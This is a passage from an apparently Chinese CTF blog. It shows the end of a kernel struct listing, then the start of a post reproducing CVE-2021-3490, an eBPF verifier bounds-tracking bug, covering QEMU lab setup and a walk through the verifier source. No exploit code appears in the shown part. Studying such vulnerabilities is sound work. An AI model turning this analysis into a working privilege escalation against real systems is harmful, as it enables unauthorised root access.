class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">            <span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="keyword">int</span>  (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*remove)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*open)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*close)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*shutdown)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write)(struct tty_struct * tty,</span><br><span class="line">              <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);</span><br><span class="line">    <span class="keyword">int</span>  (*put_char)(struct tty_struct *tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">void</span> (*flush_chars)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write_room)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*ioctl)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">long</span> (*compat_ioctl)(struct tty_struct *tty,</span><br><span class="line">                 <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">void</span> (*set_termios)(struct tty_struct *tty, struct ktermios * old);</span><br><span class="line">    <span class="keyword">void</span> (*throttle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*unthrottle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*stop)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*start)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*hangup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*break_ctl)(struct tty_struct *tty, <span class="keyword">int</span> state);</span><br><span class="line">    <span class="keyword">void</span> (*flush_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*set_ldisc)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*wait_until_sent)(struct tty_struct *tty, <span class="keyword">int</span> timeout);</span><br><span class="line">    <span class="keyword">void</span> (*send_xchar)(struct tty_struct *tty, <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmget)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmset)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">set</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span> clear);</span><br><span class="line">    <span class="keyword">int</span> (*resize)(struct tty_struct *tty, struct winsize *ws);</span><br><span class="line">    <span class="keyword">int</span> (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);</span><br><span class="line">    <span class="keyword">int</span> (*get_icount)(struct tty_struct *tty,</span><br><span class="line">                struct serial_icounter_struct *icount);</span><br><span class="line">    <span class="keyword">void</span> (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="keyword">int</span> (*poll_init)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> *options);</span><br><span class="line">    <span class="keyword">int</span> (*poll_get_char)(struct tty_driver *driver, <span class="keyword">int</span> line);</span><br><span class="line">    <span class="keyword">void</span> (*poll_put_char)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">proc_fops</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* read start from len to offset, write start from offset */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * -&gt;confirm() verifies that the data in the pipe buffer is there</span></span><br><span class="line"><span class="comment">	 * and that the contents are good. If the pages in the pipe belong</span></span><br><span class="line"><span class="comment">	 * to a file system, we may need to wait for IO completion in this</span></span><br><span class="line"><span class="comment">	 * hook. Returns 0 for good, or a negative error value in case of</span></span><br><span class="line"><span class="comment">	 * error.  If not present all pages are considered good.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">int</span> (*confirm)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * When the contents of this pipe buffer has been completely</span></span><br><span class="line"><span class="comment">	 * consumed by a reader, -&gt;release() is called.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">void</span> (*release)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Attempt to take ownership of the pipe buffer and its contents.</span></span><br><span class="line"><span class="comment">	 * -&gt;try_steal() returns %true for success, in which case the contents</span></span><br><span class="line"><span class="comment">	 * of the pipe (the buf-&gt;page) is locked and now completely owned by the</span></span><br><span class="line"><span class="comment">	 * caller. The page may then be transferred to a different mapping, the</span></span><br><span class="line"><span class="comment">	 * most often used case is insertion into different file address space</span></span><br><span class="line"><span class="comment">	 * cache.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">int</span> (*try_steal)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Get a reference to the pipe buffer.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">int</span> (*get)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/24/ebpf%20pwn+CVE-2021-3490/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/24/ebpf%20pwn+CVE-2021-3490/" class="post-title-link" itemprop="url">ebpf pwn+CVE-2021-3490</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-11-24 03:53:58" itemprop="dateCreated datePublished" datetime="2023-11-24T03:53:58+08:00">2023-11-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-12-01 01:52:52" itemprop="dateModified" datetime="2023-12-01T01:52:52+08:00">2023-12-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CVE/" itemprop="url" rel="index"><span itemprop="name">CVE</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>47k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>43 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>ebpf-pwn-A-Love-Story 复现</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ $ cat /proc/version </span><br><span class="line">Linux version <span class="number">5.11</span><span class="number">.16</span> (arttnba3@ubuntu) (gcc (Ubuntu <span class="number">9.4</span><span class="number">.0</span><span class="number">-1u</span>buntu1~<span class="number">20.04</span><span class="number">.1</span>) <span class="number">9.3</span></span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">	-m 256M \</span><br><span class="line">	-cpu kvm64,+smep,+smap \</span><br><span class="line">	-smp cores=2,threads=2 \</span><br><span class="line">	-kernel bzImage \</span><br><span class="line">	-initrd ./rootfs.cpio \</span><br><span class="line">	-nographic \</span><br><span class="line">	-monitor /dev/null \</span><br><span class="line">	-snapshot \</span><br><span class="line">	-append &quot;console=ttyS0 kaslr pti=on quiet oops=panic panic=1&quot; \</span><br><span class="line">	-no-reboot</span><br></pre></td></tr></table></figure>
<ul>
<li>smep，smap，kaslr，pti</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t tmpfs none /tmp</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">ifconfig lo 127.0.0.1 netmask 255.255.255.0</span><br><span class="line">route add -net 127.0.0.0 netmask 255.255.255.0 lo</span><br><span class="line">echo &quot;flag&#123;yhellow&#125;&quot; &gt; /flag</span><br><span class="line">chmod 666 /flag</span><br><span class="line"></span><br><span class="line">setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br><span class="line">echo &#x27;sh end!\n&#x27;</span><br><span class="line"><span class="meta">#</span><span class="bash">poweroff -d 1800000 -f &amp;</span></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>
<p>下载 5.11.16 的内核源码：<a target="_blank" rel="noopener" href="https://cdn.kernel.org/pub/linux/kernel/v5.x/">Index of /pub/linux/kernel/v5.x/</a> </p>
<p><strong>漏洞分析</strong></p>
<p>本题目没有内核模块，漏洞点为 CVE-2021-3490：</p>
<ul>
<li>CVE-2021-3490 是一个发生在 eBPF verifier 中的漏洞，由于 eBPF verifier 在校验位运算操作（ 与、或、异或 ）时没有正确地更新寄存器的 32 位边界，从而导致攻击者可以构造出非法的运行时寄存器值以进行提权</li>
</ul>
<p>在 eBPF 对寄存器计算的指令中，分为64位和32位操作两部分</p>
<ul>
<li>64位指令会对寄存器的64位全部进行操作</li>
<li>32位指令只会对寄存器的低32位进行操作</li>
</ul>
<p>eBPF 程序的安全主要是由 verifier 保证的，verifier 会模拟执行每一条指令并验证寄存器的值是否合法，主要关注这几个字段：</p>
<ul>
<li><code>smin_value</code>、<code>smax_value</code>：64 位有符号的值的可能取值边界</li>
<li><code>umin_value</code>、<code>umax_value</code>：64 位无符号的值的可能取值边界</li>
<li><code>s32_min_value</code>、<code>s32_max_value</code>：32 位有符号的值的可能取值边界</li>
<li><code>u32_min_value</code>、<code>u32_max_value</code>：32 位无符号的值的可能取值边界</li>
</ul>
<p>其中，这个寄存器中具体的值，会用如下结构体进行表示： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> &#123;</span></span><br><span class="line">	u64 value;</span><br><span class="line">	u64 mask;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>value &amp; mask</code> 表示这个寄存器中可以确定的值</li>
</ul>
<p>用于检测指令合法性的函数为 <code>do_check</code>，该函数会遍历每一条指令并根据指令的不同类型进行不同操作，对于算术指令（<code>BPF_ALU</code> / <code>BPF_ALU64</code>）而言有如下调用链（模拟通过后才能正常加载）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">do_check()        					<span class="comment">// 遍历每一条指令并根据类型调用相应函数处理</span></span><br><span class="line">-&gt;check_alu_op()       				 <span class="comment">// 根据算术指令的opcode进行不同处理</span></span><br><span class="line">-&gt;adjust_reg_min_max_vals()        	<span class="comment">// 计算新的寄存器边界值</span></span><br><span class="line">-&gt;adjust_scalar_min_max_vals()		<span class="comment">// 根据opcode计算具体的新边界值</span></span><br></pre></td></tr></table></figure>
<p>首先分析调整标量数据范围的 <code>adjust_scalar_min_max_vals</code> 函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">adjust_scalar_min_max_vals</span><span class="params">(struct bpf_verifier_env *env,</span></span></span><br><span class="line"><span class="params"><span class="function">				      struct bpf_insn *insn,</span></span></span><br><span class="line"><span class="params"><span class="function">				      struct bpf_reg_state *dst_reg,</span></span></span><br><span class="line"><span class="params"><span class="function">				      struct bpf_reg_state src_reg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line">        </span><br><span class="line">	<span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line">            </span><br><span class="line">            ......</span><br><span class="line">                </span><br><span class="line">	<span class="keyword">case</span> BPF_AND:</span><br><span class="line">		dst_reg-&gt;var_off = tnum_and(dst_reg-&gt;var_off, src_reg.var_off);</span><br><span class="line">		scalar32_min_max_and(dst_reg, &amp;src_reg); <span class="comment">/* 处理32位(漏洞函数) */</span></span><br><span class="line">		scalar_min_max_and(dst_reg, &amp;src_reg); <span class="comment">/* 处理64位 */</span></span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> BPF_OR:</span><br><span class="line">		dst_reg-&gt;var_off = tnum_or(dst_reg-&gt;var_off, src_reg.var_off);</span><br><span class="line">		scalar32_min_max_or(dst_reg, &amp;src_reg);</span><br><span class="line">		scalar_min_max_or(dst_reg, &amp;src_reg);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> BPF_XOR:</span><br><span class="line">		dst_reg-&gt;var_off = tnum_xor(dst_reg-&gt;var_off, src_reg.var_off);</span><br><span class="line">		scalar32_min_max_xor(dst_reg, &amp;src_reg);</span><br><span class="line">		scalar_min_max_xor(dst_reg, &amp;src_reg);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">            </span><br><span class="line">            ......</span><br><span class="line">                </span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		mark_reg_unknown(env, regs, insn-&gt;dst_reg);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (alu32)</span><br><span class="line">		zext_32_to_64(dst_reg);</span><br><span class="line"></span><br><span class="line">	__update_reg_bounds(dst_reg); <span class="comment">/* 对比寄存器的var_off并更新边界值 */</span></span><br><span class="line">	__reg_deduce_bounds(dst_reg); <span class="comment">/* 边界调整校验 */</span></span><br><span class="line">	__reg_bound_offset(dst_reg); <span class="comment">/* 基于边界值范围重新计算var_off的值 */</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>本 <code>cve</code> 的漏洞点位于函数 <code>scalar32_min_max_and</code>，其中的 <code>BPF_AND \ BPF_OR \ BPF_XOR</code> 三类操作有问题 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">scalar32_min_max_and</span><span class="params">(struct bpf_reg_state *dst_reg,</span></span></span><br><span class="line"><span class="params"><span class="function">				 struct bpf_reg_state *src_reg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* 判断是否能确定src_reg和dst_reg两个寄存器低32位的值(是否为&#x27;0&#x27;) */</span></span><br><span class="line">	<span class="keyword">bool</span> src_known = tnum_subreg_is_const(src_reg-&gt;var_off);</span><br><span class="line">	<span class="keyword">bool</span> dst_known = tnum_subreg_is_const(dst_reg-&gt;var_off);</span><br><span class="line">    <span class="comment">/* 获取dst_reg-&gt;var_off的低32位值,并且分别获取src_reg的s32_min_value和u32_max_value */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">var32_off</span> =</span> tnum_subreg(dst_reg-&gt;var_off);</span><br><span class="line">	s32 smin_val = src_reg-&gt;s32_min_value;</span><br><span class="line">	u32 umax_val = src_reg-&gt;u32_max_value;</span><br><span class="line">    </span><br><span class="line">	<span class="comment">/* 如果src_reg和dst_reg的值都已经确定,那么则直接返回(因为64位时还会进行更新) */</span></span><br><span class="line">	<span class="keyword">if</span> (src_known &amp;&amp; dst_known) </span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* 使用var32_off的值来更新dst_reg的u32_min_value和u32_max_value */</span></span><br><span class="line">	dst_reg-&gt;u32_min_value = var32_off.value;</span><br><span class="line">	dst_reg-&gt;u32_max_value = min(dst_reg-&gt;u32_max_value, umax_val);</span><br><span class="line">	<span class="keyword">if</span> (dst_reg-&gt;s32_min_value &lt; <span class="number">0</span> || smin_val &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* 同为负则用src_reg的最大最小值 */</span></span><br><span class="line">		dst_reg-&gt;s32_min_value = S32_MIN;</span><br><span class="line">		dst_reg-&gt;s32_max_value = S32_MAX;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* 否则用dst_reg的u32_min_value和u32_max_value更新 */</span></span><br><span class="line">		dst_reg-&gt;s32_min_value = dst_reg-&gt;u32_min_value;</span><br><span class="line">		dst_reg-&gt;s32_max_value = dst_reg-&gt;u32_max_value;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在更新 32 位边界值时，如果两个寄存器的低 32 位都为 <code>known</code> 那就可以直接跳过，因为程序认为 64 位时还会进行更新 </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">scalar_min_max_and</span><span class="params">(struct bpf_reg_state *dst_reg,</span></span></span><br><span class="line"><span class="params"><span class="function">			       struct bpf_reg_state *src_reg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* 判断是否能确定src_reg和dst_reg两个寄存器(是否为&#x27;0&#x27;) */</span></span><br><span class="line">	<span class="keyword">bool</span> src_known = tnum_is_const(src_reg-&gt;var_off);</span><br><span class="line">	<span class="keyword">bool</span> dst_known = tnum_is_const(dst_reg-&gt;var_off);</span><br><span class="line">    <span class="comment">/* 获取dst_reg-&gt;var_off的值,并且分别获取src_reg的smin_value和umax_value */</span></span><br><span class="line">	s64 smin_val = src_reg-&gt;smin_value;</span><br><span class="line">	u64 umax_val = src_reg-&gt;umax_value;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 如果src_reg和dst_reg的值都已经确定,那么更新边界值 */</span></span><br><span class="line">	<span class="keyword">if</span> (src_known &amp;&amp; dst_known) &#123;</span><br><span class="line">		__mark_reg_known(dst_reg, dst_reg-&gt;var_off.value);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* We get our minimum from the var_off, since that&#x27;s inherently</span></span><br><span class="line"><span class="comment">	 * bitwise.  Our maximum is the minimum of the operands&#x27; maxima.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	dst_reg-&gt;umin_value = dst_reg-&gt;var_off.value;</span><br><span class="line">	dst_reg-&gt;umax_value = min(dst_reg-&gt;umax_value, umax_val);</span><br><span class="line">	<span class="keyword">if</span> (dst_reg-&gt;smin_value &lt; <span class="number">0</span> || smin_val &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="comment">/* Lose signed bounds when ANDing negative numbers,</span></span><br><span class="line"><span class="comment">		 * ain&#x27;t nobody got time for that.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		dst_reg-&gt;smin_value = S64_MIN;</span><br><span class="line">		dst_reg-&gt;smax_value = S64_MAX;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">/* ANDing two positives gives a positive, so safe to</span></span><br><span class="line"><span class="comment">		 * cast result into s64.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		dst_reg-&gt;smin_value = dst_reg-&gt;umin_value;</span><br><span class="line">		dst_reg-&gt;smax_value = dst_reg-&gt;umax_value;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/* We may learn something more from the var_off */</span></span><br><span class="line">	__update_reg_bounds(dst_reg); <span class="comment">/* 对比寄存器的var_off并更新边界值 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>在更新64位边界值时，若两个寄存器都为 <code>known</code> 就直接调用 <code>__mark_reg_known</code>（PS：64位和32位判断调用 <code>__mark_reg_known</code> 的条件不同，这也引发了漏洞）</li>
<li><code>__mark_reg_known</code> 用于设置一个已经确定的寄存器，简单的调用 <code>tnum_const</code> 设置寄存器 <code>var_off</code> 为 <code>known</code>，并给对应边界赋值</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __mark_reg_known(struct bpf_reg_state *reg, u64 imm)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* Clear id, off, and union(map_ptr, range) */</span></span><br><span class="line">	<span class="built_in">memset</span>(((u8 *)reg) + <span class="keyword">sizeof</span>(reg-&gt;type), <span class="number">0</span>,</span><br><span class="line">	       offsetof(struct bpf_reg_state, var_off) - <span class="keyword">sizeof</span>(reg-&gt;type));</span><br><span class="line">	___mark_reg_known(reg, imm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> ___mark_reg_known(struct bpf_reg_state *reg, u64 imm)</span><br><span class="line">&#123;</span><br><span class="line">	reg-&gt;var_off = tnum_const(imm);</span><br><span class="line">	reg-&gt;smin_value = (s64)imm;</span><br><span class="line">	reg-&gt;smax_value = (s64)imm;</span><br><span class="line">	reg-&gt;umin_value = imm;</span><br><span class="line">	reg-&gt;umax_value = imm;</span><br><span class="line"></span><br><span class="line">	reg-&gt;s32_min_value = (s32)imm;</span><br><span class="line">	reg-&gt;s32_max_value = (s32)imm;</span><br><span class="line">	reg-&gt;u32_min_value = (u32)imm;</span><br><span class="line">	reg-&gt;u32_max_value = (u32)imm;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在最后还会调用 <code>__update_reg_bounds()</code> 对比寄存器的 <code>var_off</code> 并更新边界值： </p>
